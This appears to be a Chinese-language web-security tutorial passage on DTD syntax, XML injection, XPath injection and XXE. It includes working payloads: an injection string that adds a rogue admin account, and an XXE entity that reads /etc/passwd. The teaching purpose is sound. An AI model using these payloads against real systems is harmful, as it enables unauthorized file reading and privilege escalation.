&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;DTD 实例：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ATTLIST payment Luckey CDATA &amp;quot;Q&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;XML 实例：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;payment Luckey=&amp;quot;Q&amp;quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://fc04db.oss-cn-hangzhou.aliyuncs.com/image/202405291638220.png&#34; alt=&#34;image-20240529163855082&#34;&gt;&lt;/p&gt;
&lt;p&gt;默认&lt;strong&gt;属性值&lt;/strong&gt;可使用下列值 :&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://fc04db.oss-cn-hangzhou.aliyuncs.com/image/202405291639746.png&#34; alt=&#34;image-20240529163957712&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;默认属性值&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;DTD:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ELEMENT &lt;span class=&#34;keyword&#34;&gt;square&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;EMPTY&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ATTLIST &lt;span class=&#34;keyword&#34;&gt;square&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;width&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;CDATA&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;合法的 XML:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;square&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;width&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;100&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;在上面的例子中，“square” 被定义为带有 CDATA 类型的 “width” 属性的空元素。如果宽度没有被设定，其默认值为 0&lt;/p&gt;
&lt;h1 id=&#34;xml注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xml注入&#34;&gt;#&lt;/a&gt; XML 注入&lt;/h1&gt;
&lt;p&gt;XML 是一种数据组织存储的数据结构方式，安全的 XML 在用户输入生成新的数据时候应该只能允许用户接受的数据，需要过滤掉一些可以改变 XML 标签也就是说改变 XML 结构插入新功能（例如新的账户信息，等于添加了账户）的特殊输入，如果没有过滤，则可以导致 XML 注入攻击。&lt;/p&gt;
&lt;p&gt;注入实例：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&lt;span class=&#34;string&#34;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; encoding=&lt;span class=&#34;string&#34;&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;manager&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;admin&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;username&lt;/span&gt;&amp;gt;&lt;/span&gt;admin&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;username&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;password&lt;/span&gt;&amp;gt;&lt;/span&gt;admin&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;password&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;admin&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;admin&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;username&lt;/span&gt;&amp;gt;&lt;/span&gt;root&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;username&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;password&lt;/span&gt;&amp;gt;&lt;/span&gt;root&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;password&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;admin&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;manager&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;XML 与 HTML 一样，也存在注入攻击，在注入的方法上也非常相似。&lt;br&gt;
对于上面的 xml 文件，如果攻击者能够掌控 password 字段，那么就会产生 XML 注入。如攻击者输入：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;admin &amp;lt;/password&amp;gt;&amp;lt;/admin&amp;gt;&amp;lt;admin id=&amp;quot;3&amp;quot;&amp;gt;&amp;lt;name&amp;gt;hack&amp;lt;/name&amp;gt;&amp;lt;password&amp;gt;hacker&amp;lt;/password&amp;gt;&amp;lt;/admin&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;最终修改结果为：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&lt;span class=&#34;string&#34;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; encoding=&lt;span class=&#34;string&#34;&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;manager&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;admin&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;admin&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;password&lt;/span&gt;&amp;gt;&lt;/span&gt;admin&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;password&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;admin&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;admin&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;username&lt;/span&gt;&amp;gt;&lt;/span&gt;root&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;username&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;password&lt;/span&gt;&amp;gt;&lt;/span&gt;root&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;password&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;admin&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;admin&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;3&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;hack&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;password&lt;/span&gt;&amp;gt;&lt;/span&gt;hacker&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;password&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;admin&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;manager&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;这样就通过 XML 注入添加了一个名为 hack、密码为：hacker 的管理员账户。&lt;br&gt;
XML 注入两大要素：&lt;strong&gt;标签闭合和获取 XML 表结构&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;xpath注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xpath注入&#34;&gt;#&lt;/a&gt; XPath 注入&lt;/h1&gt;
&lt;p&gt;XPath 是一门在 XML 文档中查找信息的语言。XPath 用于在 XML 文档中，通过元素和属性进行导航。类似 jquery 选择器的选择路径。&lt;/p&gt;
&lt;p&gt;XPath 注入攻击是指利用 XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的 XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath 注入攻击是针对 Web 服务应用新的攻击方法，它允许攻击者在事先不知道 XPath 查询相关知识的情况下，通过 XPath 查询得到一个 XML 文档的完整内容。&lt;/p&gt;
&lt;p&gt;XPath 注入发生在当站点使用用户输入的信息来构造请求以获取 XML 数据。攻击者对站点发送经过特殊构造的信息来探究站点使用的 XML 是如何构造的，从而进一步获取正常途径下无法获取的数据。当 XML 数据被用作账户验证时，攻击者还可以提升他的权限。&lt;/p&gt;
&lt;p&gt;XPath 注入攻击利用两种技术，即&lt;strong&gt; XPath 扫描&lt;/strong&gt;和 &lt;strong&gt;XPath 查询布尔化&lt;/strong&gt;。通过该攻击，攻击者可以控制用来进行 XPath 查询的 XML 数据库。这种攻击可以有效地对付使用 XPath 查询（和 XML 数据库） 来执行身份验证、查找或者其它操作。&lt;/p&gt;
&lt;p&gt;XPath 注入攻击同 SQL 注入攻击类似，但与 SQL 注入相比，XPath 具有的优势：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;广泛性&lt;br&gt;
只要是利用 XPath 语法的 Web 应用程序若未对输入的 XPath 查询做严格的处理都会存在 XPath 注入漏洞。而在 SQL 注入攻击过程中根据数据库支持的 SQL 语言不同，注入攻击的实现可能不同。&lt;/li&gt;
&lt;li&gt;危害性大&lt;br&gt;
 XPath 语言几乎可以没有访问控制限制的引用 XML 文档的所有部分。而在 SQL 注入中，一个 “ &lt;code&gt;用户&lt;/code&gt; ” 的权限可能被限制到 某一特定的表、列或者查询。&lt;br&gt;
XPath 注入攻击可以保证得到完整的 XML 文档，即完整的数据库。只要 Web 服务应用具有基本的安全漏洞，即可构造针对 XPath 应用的自动攻击。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/backlion/p/8554749.html&#34;&gt;xpath 注入详解 &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;xxe&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xxe&#34;&gt;#&lt;/a&gt; XXE&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;XXE(XML External Entity Injection)&lt;/code&gt;  全称为 XML 外部实体注入，由于程序在解析输入的 XML 数据时，解析了攻击者伪造的外部实体而产生的。例如 PHP 中的 &lt;code&gt;simplexml_load&lt;/code&gt;  默认情况下会解析外部实体，有 XXE 漏洞的标志性函数为 &lt;code&gt;simplexml_load_string()&lt;/code&gt; ，它允许攻击者干扰应用程序对 XML 数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;XXE 的特征&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;特征 1 —  &lt;code&gt;.ashx&lt;/code&gt; ，url 是，ashx 后缀&lt;/p&gt;
&lt;p&gt;特征 2 — 响应体是 xml&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;XXE 的检测&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先检测 XML 是否会被成功解析&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&lt;span class=&#34;string&#34;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; encoding=&lt;span class=&#34;string&#34;&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt;?&amp;gt;&lt;/span&gt; &lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;keyword&#34;&gt;ANY&lt;/span&gt; [ &lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY &lt;span class=&#34;keyword&#34;&gt;words&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Hello XXE !&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;]&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;root&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;words;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;root&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;看相应包或页面是否有 &lt;code&gt;Hellp XXE&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;接下来检测该端点是否支持 DTD 引用外部实体：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=”1.0” encoding=”UTF-8”?&amp;gt;&lt;/span&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;keyword&#34;&gt;ANY&lt;/span&gt; [&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;keyword&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;http://localhost/tp5/test.xml&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;%name;]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h2 id=&#34;文件读取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件读取&#34;&gt;#&lt;/a&gt; 文件读取&lt;/h2&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Xml&#34;&gt;&lt;figure class=&#34;iseeu highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&lt;span class=&#34;string&#34;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; encoding=&lt;span class=&#34;string&#34;&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;?&amp;gt;&lt;/span&gt; &lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;keyword&#34;&gt;xxe&lt;/span&gt; [&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ELEMENT &lt;span class=&#34;keyword&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;ANY&lt;/span&gt; &amp;gt;&lt;/span&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY &lt;span class=&#34;keyword&#34;&gt;xxe&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;file:///etc/passwd&amp;quot;&lt;/span&gt; &amp;gt;&lt;/span&gt;]&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;root&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;root&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;前提是需要有回显&lt;/p&gt;
&lt;h2 id=&#34;ssrf与xxe&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrf与xxe&#34;&gt;#&lt;/a&gt; SSRF 与 XXE&lt;/h2&gt;
&lt;p&gt;XXE 可以与 SSRF（服务端请求伪造） 漏洞一起用于探测其它内网主机的信息，基于 http 协议。&lt;/p&gt;
